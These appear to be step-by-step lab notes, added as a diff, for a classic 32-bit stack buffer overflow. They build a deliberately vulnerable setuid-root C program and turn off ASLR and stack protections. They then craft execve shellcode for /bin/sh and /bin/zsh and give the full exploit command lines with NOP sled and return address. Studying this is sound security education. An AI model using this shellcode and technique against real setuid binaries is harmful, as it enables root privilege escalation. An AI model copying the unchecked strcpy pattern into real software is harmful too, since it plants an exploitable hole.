@@ -1,0 +1,120 @@
+install nasm
+sudo apt-get install nasm
+
+Program to check randomization
+nano check.c
+
+#include <stdio.h>
+void main() {
+        register int i asm("esp");
+        printf("$esp = %#010x\n", i);
+}
+
+compile and run
+gcc -o check check.c
+./check
+./check
+./check
+
+Turn of randomization:
+sudo sysctl -w kernel.randomize_va_space=0
+
+recheck randomization
+./check
+./check
+
+add test user
+sudo adduser test
+
+goto test home
+cd ..
+cd test
+
+create vuln file
+sudo nano vuln.c
+
+#include <stdio.h>
+#include <string.h>
+
+void func(char *name)
+{
+    char buf[100];
+    strcpy(buf, name);
+    printf("Welcome %s\n", buf);
+}
+
+int main(int argc, char *argv[])
+{
+    func(argv[1]);
+    return 0;
+}
+
+compile 
+sudo gcc vuln.c -o vuln -fno-stack-protector -z execstack
+
+sudo chown root:test vuln
+sudo chmod 550 vuln
+sudo chmod u+s vuln
+
+check by: ls -l vuln 
+should return: -r-sr-x--- 1 root test 7392 Dec 22 00:27 vuln
+
+disable ASLR
+echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space
+
+su test
+objdump -d -M intel vuln
+
+Craft shellcode.nasm for /bin//sh
+
+nano shellcode.nasm
+
+xor     eax, eax    ;Clearing eax register
+push    eax         ;Pushing NULL bytes
+push    0x68732f2f  ;Pushing //sh
+push    0x6e69622f  ;Pushing /bin
+mov     ebx, esp    ;ebx now contains address of /bin//sh
+push    eax         ;Pushing NULL byte
+mov     edx, esp    ;edx now contains address of NULL byte
+push    ebx         ;Pushing address of /bin//sh
+mov     ecx, esp    ;ecx now contains address of address of /bin//sh byte
+mov     al, 11      ;syscall number of execve is 11
+int     0x80        ;Make the system call
+
+compile:
+nasm -f elf shellcode.nasm
+
+get the bytes
+objdump -d -M intel shellcode.o
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+
+gdb -q vuln
+break func
+run $(python -c 'print "A"*116')
+print $ebp
+print $ebp - 0x6c
+
+0xbfffef8c + 20 = 0xbfffefa0 -> \xa0\xef\xff\xbf
+
+./vuln $(python -c 'print "\x90"*40+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*47+"\xa0\xef\xff\xbf"')
+
+
+shellcode with zsh: but first install zsh sudo apt-get install zsh
+xor     eax, eax    
+push    eax         
+push    0x68737a2f
+push    0x6e69622f  
+mov     ebx, esp    
+push    eax         
+mov     edx, esp    
+push    ebx         
+mov     ecx, esp    
+mov     al, 11      
+int     0x80        
+
+\x31\xc0\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+./vuln $(python -c 'print "\x90"*40+"\x31\xc0\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*47+"\xa0\xef\xff\xbf"')
+---------------------------------------------------------------------
+
